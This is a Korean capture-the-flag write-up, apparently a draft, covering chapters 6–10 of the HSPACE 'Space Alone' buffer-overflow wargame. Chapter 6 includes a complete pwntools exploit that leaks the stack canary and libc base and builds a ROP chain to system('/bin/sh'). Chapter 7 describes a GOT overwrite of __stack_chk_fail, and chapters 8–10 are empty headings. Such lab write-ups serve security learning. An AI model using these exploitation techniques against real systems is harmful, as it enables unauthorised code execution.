### 조수호(shielder)

### 목차
1. Write-up (6-10)
   - Chapter 6
   - Chapter 7
   - Chapter 8
   - Chapter 9
   - Chapter 10
2. 피드백
3. 마무리

안녕하세요, HSPACE 나이츠에서 활동중인 조수호(shielder)입니다. 본 글에서는 앞선 글에 이어 [Space Alone](https://github.com/hspace-io/HSPACE-LOB) Chapter6 ~ Chapter10를 풀어보겠습니다.

---
## Write-up

### Chapter 6

- 보호기법 분석
```bash
Crisis_at_the_Vault@hsapce-io:~$ checksec prob
[*] '/home/Crisis_at_the_Vault/prob'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
`Partial RELRO` 상태입니다. 카나리가 있고, `PIE`가 꺼져 있습니다.

- 코드 분석
```C
#include <stdio.h>

void menu(){
    puts("1. read diary");
    puts("2. write diary");
    puts("3. put down the diary");
    printf("> ");
}

int main(){
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    int ch, index = 0;
    char page1[] = "As soon as I arrived here, I locked the door tightly.\nCatching my breath, it feels like a miracle that I managed to escape safely.";
    char page2[] = "Looking around, there isn't much food left.\nTo survive, I'll have to go out again soon.";
    char page3[] = "I checked my weapons and packed the necessary supplies in my bag.\nAccording to rumors I heard outside, there's a vaccine at a nearby lab.";
    char page4[] = "As I headed out, I could hear the zombies' cries.\nMy heart was pounding wildly, but I moved quietly.";
    char page5[] = "At that moment, a zombie suddenly attacked me.\nAs I checked the bite wound on my arm, I realized that the vaccine at the lab was now my last hope.";
    char hidden[] = "Failed, failed, failed, failed, failed, faile... itchy, tasty";
    char* diary[] = {page1, page2, page3, page4, page5, hidden};\

	중략(출력 부분)

    while(1){
        menu();
        scanf("%d", &ch);
        if (ch == 1){
            printf("index (0~4) : ");
            scanf("%d", &index);
            if (index >= 6 || index < 0){
                puts("invalid index");
                continue;
            }
            puts(diary[index]);
        }
        else if (ch == 2){
            printf("index (0~4) : ");
            scanf("%d", &index);
            if (index >= 6 || index < 0){
                puts("invalid index");
                continue;
            }
            printf("content > ");
            read(0, diary[index], 0x100);
        }
        else if (ch == 3){
            break;
        }
    }
    puts("Ok let's go!");
    return 0;
```
모든 메뉴를 무한 번 실행 가능합니다. 1번 메뉴에서 `diary`의 내용을 출력할 수 있습니다. 2번 메뉴에서 `0x100` 바이트만큼 쓸 수 있습니다. 그런데 `page1, page2, page3, page4, page5, hidden`을 보니 `0x100` 바이트보다 적은 길이를 가지고 있어보입니다. `scp` 명령어로 파일을 꺼내 `ida`로 이어서 분석하겠습니다.

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+8h] [rbp-308h] BYREF
  unsigned int v5; // [rsp+Ch] [rbp-304h] BYREF
  char *s[6]; // [rsp+10h] [rbp-300h]
  char v7[64]; // [rsp+40h] [rbp-2D0h] BYREF
  char v8[96]; // [rsp+80h] [rbp-290h] BYREF
  char v9[112]; // [rsp+E0h] [rbp-230h] BYREF
  char v10[144]; // [rsp+150h] [rbp-1C0h] BYREF
  char v11[144]; // [rsp+1E0h] [rbp-130h] BYREF
  char v12[152]; // [rsp+270h] [rbp-A0h] BYREF
  unsigned __int64 v13; // [rsp+308h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  v5 = 0;
  strcpy(
    v10,
    "As soon as I arrived here, I locked the door tightly.\n"
    "Catching my breath, it feels like a miracle that I managed to escape safely.");
  strcpy(v8, "Looking around, there isn't much food left.\nTo survive, I'll have to go out again soon.");
  strcpy(
    v11,
    "I checked my weapons and packed the necessary supplies in my bag.\n"
    "According to rumors I heard outside, there's a vaccine at a nearby lab.");
  strcpy(v9, "As I headed out, I could hear the zombies' cries.\nMy heart was pounding wildly, but I moved quietly.");
  strcpy(
    v12,
    "At that moment, a zombie suddenly attacked me.\n"
    "As I checked the bite wound on my arm, I realized that the vaccine at the lab was now my last hope.");
  strcpy(v7, "Failed, failed, failed, failed, failed, faile... itchy, tasty");
  s[0] = v10;
  s[1] = v8;
  s[2] = v11;
  s[3] = v9;
  s[4] = v12;
  s[5] = v7;

후략
```
위의 코드와 비교해보면 `v12`가 `page5`와 같음을 알 수 있습니다. `v12`는 `rbp-0xa0`에 정의되어 있으므로 `bof`가 발생합니다.

- 익스플로잇 설계
카나리가 있고, 마스터 카나리를 조작하는 문제는 아니므로 카나리를 알아내야 합니다. 2번 메뉴로 `page5`(4번 인덱스)에 `0x98 + 1`(카나리의 첫 바이트는 `\x00`이기 때문에 1을 더합니다.)만큼 바이트를 입력한 후 1번 메뉴로 출력시켜 카나리를 알아냅니다.
비슷한 방법으로 `0xa8` 만큼 바이트를 입력한 후 출력시켜 `libc_base`를 알아낼 수 있습니다. `main` 함수 진행 중에 `ret` 값과 `backtrace`는 다음과 같습니다.
```
pwndbg> x/2gx $rbp
0x7fffffffe320: 0x0000000000000001      0x00007ffff7db3d90
pwndbg> backtrace
#0  0x00000000004011d8 in main ()
#1  0x00007ffff7db3d90 in __libc_start_call_main (main=main@entry=0x4011aa <main>, argc=argc@entry=1, argv=argv@entry=0x7fffffffe438) at ../sysdeps/nptl/libc_start_call_main.h:58
#2  0x00007ffff7db3e40 in __libc_start_main_impl (main=0x4011aa <main>, argc=1, argv=0x7fffffffe438, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffe428) at ../csu/libc-start.c:392
#3  0x00000000004010b5 in _start ()
```
하지만 `pwndbg`는 `libc_start_call_main` 심볼을 찾지 못하기 때문에 `offset`을 직접 찾아줘야 합니다. `vmmap` 명령어를 통해 `gdb`상에서 `libc_base`를 찾을 수 있고, 두 값을 빼주면 `offset`을 구할 수 있습니다(`0x7ffff7db3d90 - 0x7ffff7d8a000 = 0x29d90`). `bof` 크기가 넉넉하기 때문에 `system('/bin/sh')`을 호출하는 방향으로 익스하겠습니다.
(ROPgadget 사용 방법은 전 포스팅 Chapter4에 소개되어 있으므로 생략하겠습니다.)

- 익스플로잇
```python
from pwn import *

p = process('./prob')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def read(idx : int) :
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(idx).encode())
    return p.recvline()[:-1]

def write(idx : int, msg : bytes) :
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendafter(b'> ', msg)

write(4, b'a' * 0x99)
canary = u64(b'\x00' + read(4)[0x99:][:7])
print("canary = " + hex(canary))

write(4, b'a' * 0xa8)
l.address = u64(read(4)[0xa8:][:6] + b'\x00' * 2) - 0x29d90
print("libc_base = " + hex(l.address))

ret = 0x40101a
binsh = list(l.search(b'/bin/sh'))[0]
system = l.sym['system']
pop_rdi = 0x2a3e5 + l.address
payload = b'a' * 0x98 + p64(canary) + b'b' * 0x8 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
write(4, payload)

p.sendlineafter(b'> ', b'3')
p.interactive()
```
필자는 `/bin/sh` 문자열 찾는 방법으로 `list(l.search(b'/bin/sh'))[0]`을 선호합니다. `/bin/sh` 찾는 방법을 잘 모르셨다면 이를 추천합니다. `one_gadget`을 사용하여도 무방하지만, `vm`에 `one_gadget`이 안 깔려있는 것을 보아 인텐이 아닌 것 같아 해당 방법으로 풀지는 않았습니다.

--- 
### Chapter 7

- 보호기법 분석
```bash
[*] '/home/Wired_at_the_Vault/got'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
`Partial RELRO` 상태입니다. 카나리가 있고, `PIE`가 꺼져 있습니다.

- 코드 분석
```C
#include <stdio.h>
/*
    HSpace Lord of the BOF
    - got
*/

unsigned long long wire[100];


void startup(){
    puts("Hope the car starts!");
    char wish[0x100];
    read(0, wish, 0x200);
}

void menu(){
    puts("1. Re-map ecu");
    puts("2. Start a car");
    puts("3. Die XD");
}

int main(int argc, char *argv[]){
    setbuf(stdout, 0);
    setbuf(stdin, 0);
    puts("Kill switch enabled");
    puts("The car won't start if the kill switch is on");
    while(1){
        int select;
        menu();
        printf("> ");
        scanf("%d", &select);
        getchar();
        if (select == 1){
            printf("number : ");
            scanf("%d", &select);
            getchar();
            printf("value : ");
            scanf("%llu", &wire[select]);
        }else if (select == 2){
            startup();
        }else{
            puts("Grrrrr....!!!");
            return 1;
        }
    }
}
```
모든 메뉴를 무한 번 실행 가능합니다. 1번 메뉴는 `wire` 배열에 접근하여 값을 쓰는 기능을 합니다. 이 때 `select`에 대한 검사가 없기 때문에 `oob` 취약점이 발생합니다. 그리고 `wire` 배열이 `bss`에 위치해있는 점, `Partial RELRO`인 점을 종합하면 `got overwrite`가 가능합니다. 2번 메뉴는 `startup` 함수를 실행합니다. `startup` 함수에서는 `bof`가 발생합니다.

- 익스플로잇 설계
카나리가 있기 때문에, 이를 알아내야 하는데 릭 벡터를 일차원적으로 찾을 수는 없습니다. 따라서 카나리를 변조해야만 하는데, 이러면  `got overwrite`를 사용해야 합니다. 스택 프레임 내부의 카나리 값이 기존 카나리 값과 달라지면 `__stack_chk_fail` 함수를 호출합니다. 따라서 이 함수의 `got` 영역을 변조하고 의도적으로 호출하도록 설계합니다. `bof` 크기가 크기 때문에 `got overwrite`에서 체이닝을 고려할 필요는 없고 `ret` 주소로만 변조해도 충분합니다. 이러면 그냥 다음 어셈블리어 코드가 실행되므로 카나리 체크는 없는 것과 마찬가지입니다.


- 익스플로잇

---
### Chapter 8

- 보호기법 분석
- 코드 분석
- 익스플로잇 설계
- 익스플로잇

---
### Chapter 9

- 보호기법 분석
- 코드 분석
- 익스플로잇 설계
- 익스플로잇

---
### Chapter 10

- 보호기법 분석
- 코드 분석
- 익스플로잇 설계
- 익스플로잇

## 피드백

5장과 6장이 매우 유사한데 둘 다 넣을 필요가 있나
심지어 5장에 canary있는데 태그에 안 적혀있음